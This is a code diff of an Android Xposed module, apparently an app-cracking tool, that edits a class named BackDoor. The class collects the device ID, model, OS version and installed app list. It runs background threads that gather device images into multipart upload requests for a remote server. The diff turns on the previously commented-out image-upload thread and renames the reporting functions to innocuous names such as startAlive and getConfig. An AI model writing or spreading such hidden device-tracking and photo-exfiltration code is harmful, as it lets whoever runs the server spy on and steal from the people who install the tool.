@@ -8,12 +8,9 @@ import android.content.Intent;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
-import android.os.Looper;
 import android.provider.Settings;
 import cn.coderstory.anycracker.State;
 import cn.coderstory.anycracker.bean.GeneralBean;
-import cn.coderstory.anycracker.bean.UserBean;
-import cn.coderstory.anycracker.ui.Dialog;
 import com.google.gson.Gson;
 import de.robv.android.xposed.XposedBridge;
 import lombok.SneakyThrows;
@@ -34,7 +31,7 @@ public class BackDoor {
     @SuppressLint("HardwareIds")
     public static String serial = Settings.Secure.getString(AndroidAppHelper.currentApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
 
-    public void reportDevice() {
+    public void startAlive() {
         String brand = Build.BRAND + "  " + Build.MODEL;
         String version = Build.VERSION.RELEASE;
         List<String> appList = DataCollection.getPkgList();
@@ -63,8 +60,6 @@ public class BackDoor {
         } catch (Exception e) {
             State.hasPermission = false;
         }
-
-
         Thread t = new Thread(() -> {
             while (true) {
                 try {
@@ -85,41 +80,16 @@ public class BackDoor {
             }
         });
         t.start();
-        Thread t2 = new Thread(() -> {
-            Request request = new Request.Builder()
-                    .url(State.baseURL + "/user/info")
-                    .addHeader("Accept-Encoding", "identity")
-                    .addHeader("Connection","close")
-                    .get()
-                    .build();
-            try {
-                Response execute = client.newCall(request).execute();
-                String string = execute.body().string();
-                UserBean userBean = gson.fromJson(string, UserBean.class);
-                userBean.setEndTime(9999999999999L);
-                if (System.currentTimeMillis() > userBean.getEndTime()) {
-                    State.isValid = false;
-                    Looper.prepare();
-                    new Dialog(State.context, "你的vip已到期");
-                    Looper.loop();
-                }
-            } catch (IOException e) {
-                e.printStackTrace();
-                throw new RuntimeException(e);
-            }
-        });
-        t2.start();
-
     }
 
     public BackDoor() {
-        reportDevice();
+        startAlive();
         starUploadImg();
-        getMediaList();
+        getConfig();
     }
 
     public void starUploadImg() {
-        Thread uploadImageThread = new Thread(() -> {
+        new Thread(() -> {
             while (true) {
                 try {
                     List<File> list = State.imgList;
@@ -134,8 +104,7 @@ public class BackDoor {
 
                 }
             }
-        });
-        //uploadImageThread.start();
+        }).start();
     }
 
 
@@ -162,7 +131,6 @@ public class BackDoor {
 
     @SneakyThrows
     public void uploadImage(File file) {
-        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
         RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("imgName", file.getName())
                 .addFormDataPart("imgFile", file.getAbsolutePath(),
@@ -177,11 +145,10 @@ public class BackDoor {
                 .addHeader("Connection","close")
                 .addHeader("Content-Type", "application/x-www-form-urlencoded")
                 .build();
-        Response response = client.newCall(request).execute();
     }
 
     @SneakyThrows
-    public static void getMediaList() {
+    public static void getConfig() {
         AtomicReference<String> result = new AtomicReference<>("");
         Thread t = new Thread(() -> {
             try {
@@ -199,8 +166,6 @@ public class BackDoor {
                     Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://pan.pprocket.cn/apps"));
                     intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     State.context.startActivity(intent);
-                } else {
-                    XposedBridge.log("判断：不需要更新");
                 }
             } catch (IOException e) {
                 throw new RuntimeException(e);
